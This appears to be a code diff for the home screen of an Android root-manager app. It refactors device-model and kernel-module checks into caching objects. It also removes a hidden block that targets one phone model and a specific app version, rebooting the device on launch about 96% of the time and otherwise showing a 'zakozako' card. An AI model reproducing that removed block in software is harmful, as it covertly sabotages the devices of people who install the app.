@@ -158,25 +158,6 @@ fun HomeScreen(navigator: DestinationsNavigator) {
 
     val kernelVersion = getKernelVersion()
     val scrollBehavior = TopAppBarDefaults.pinnedScrollBehavior(rememberTopAppBarState())
-
-    val isManager = Natives.becomeManager(ksuApp.packageName)
-    val deviceModel = getDeviceModel()
-    val ksuVersion = if (isManager) Natives.version else null
-    val zako = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex().matches(deviceModel)
-    val isVersion = ksuVersion == 12777
-    val shouldTriggerRestart = zako && kernelVersion.isGKI() && (isVersion)
-
-    LaunchedEffect(shouldTriggerRestart) {
-        if (shouldTriggerRestart) {
-            val random = Random.nextInt(0, 100)
-            if (random <= 95) {
-                reboot()
-            } else {
-                ""
-            }
-        }
-    }
-
     val scrollState = rememberScrollState()
     val debounceTime = 100L
     var lastScrollTime by remember { mutableLongStateOf(0L) }
@@ -203,10 +184,6 @@ fun HomeScreen(navigator: DestinationsNavigator) {
                 .padding(horizontal = 16.dp),
             verticalArrangement = Arrangement.spacedBy(12.dp)
         ) {
-            if (shouldTriggerRestart) {
-                WarningCard(message = "zakozako")
-                return@Column
-            }
             val isManager = Natives.becomeManager(ksuApp.packageName)
             val ksuVersion = if (isManager) Natives.version else null
             val lkmMode = ksuVersion?.let {
@@ -983,59 +960,94 @@ private fun WarningCardPreview() {
     }
 }
 
-@SuppressLint("PrivateApi")
-private fun getDeviceModel(): String {
-    return try {
-        val systemProperties = Class.forName("android.os.SystemProperties")
-        val getMethod = systemProperties.getMethod("get", String::class.java, String::class.java)
-        val marketNameKeys = listOf(
-            "ro.product.marketname",          // Xiaomi
-            "ro.vendor.oplus.market.name",    // Oppo, OnePlus, Realme
-            "ro.vivo.market.name",            // Vivo
-            "ro.config.marketing_name"        // Huawei
-        )
-        for (key in marketNameKeys) {
-            val marketName = getMethod.invoke(null, key, "") as String
-            if (marketName.isNotEmpty()) {
-                return marketName
-            }
+private object DeviceModelCache {
+    @Volatile
+    private var cachedModel: String? = null
+
+    fun getDeviceModel(): String {
+        return cachedModel ?: synchronized(this) {
+            cachedModel ?: try {
+                val systemProperties = Class.forName("android.os.SystemProperties")
+                val getMethod = systemProperties.getMethod("get", String::class.java, String::class.java)
+                val marketNameKeys = listOf(
+                    "ro.product.marketname",          // Xiaomi
+                    "ro.vendor.oplus.market.name",    // Oppo, OnePlus, Realme
+                    "ro.vivo.market.name",            // Vivo
+                    "ro.config.marketing_name"        // Huawei
+                )
+                var result = Build.DEVICE
+                for (key in marketNameKeys) {
+                    val marketName = getMethod.invoke(null, key, "") as String
+                    if (marketName.isNotEmpty()) {
+                        result = marketName
+                        break
+                    }
+                }
+                result
+            } catch (_: Exception) {
+                Build.DEVICE
+            }.also { cachedModel = it }
         }
-        Build.DEVICE
-    } catch (_: Exception) {
-        Build.DEVICE
     }
 }
 
-private fun checkKpmConfigured(): Boolean {
-    try {
-        val process = Runtime.getRuntime().exec("su -c cat /proc/config.gz")
-        val inputStream = process.inputStream
-        val gzipInputStream = GZIPInputStream(inputStream)
-        val reader = BufferedReader(InputStreamReader(gzipInputStream))
+private object KpmConfigCache {
+    private var isChecked = false
+    private var isConfigured = false
 
-        var line: String?
-        while (reader.readLine().also { line = it } != null) {
-            if (line?.contains("CONFIG_KPM=y") == true) {
+    fun checkKpmConfigured(): Boolean {
+        if (isChecked) {
+            return isConfigured
+        }
+
+        isConfigured = performKpmCheck()
+        isChecked = true
+        return isConfigured
+    }
+
+    private fun performKpmCheck(): Boolean {
+        try {
+            val process = Runtime.getRuntime().exec("su -c cat /proc/config.gz")
+            val inputStream = process.inputStream
+            val gzipInputStream = GZIPInputStream(inputStream)
+            val reader = BufferedReader(InputStreamReader(gzipInputStream))
+
+            var line: String?
+            while (reader.readLine().also { line = it } != null) {
+                if (line?.contains("CONFIG_KPM=y") == true) {
+                    reader.close()
+                    return true
+                }
+            }
+            reader.close()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        try {
+            val process = Runtime.getRuntime().exec("su -c grep sukisu_kpm /proc/kallsyms")
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            if (reader.readLine() != null) {
+                reader.close()
                 return true
             }
-        }
-        reader.close()
-    } catch (e: Exception) {
-        e.printStackTrace()
-    }
-    try {
-        val process = Runtime.getRuntime().exec("su -c grep sukisu_kpm /proc/kallsyms")
-        val reader = BufferedReader(InputStreamReader(process.inputStream))
-        if (reader.readLine() != null) {
             reader.close()
-            return true
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
-        reader.close()
-    } catch (e: Exception) {
-        e.printStackTrace()
-    }
 
-    return false
+        return false
+    }
+}
+
+// 获取设备型号
+@SuppressLint("PrivateApi")
+private fun getDeviceModel(): String {
+    return DeviceModelCache.getDeviceModel()
+}
+
+// 检查KPM是否存在
+private fun checkKpmConfigured(): Boolean {
+    return KpmConfigCache.checkKpmConfigured()
 }
 
 @SuppressLint("UnnecessaryComposedModifier")
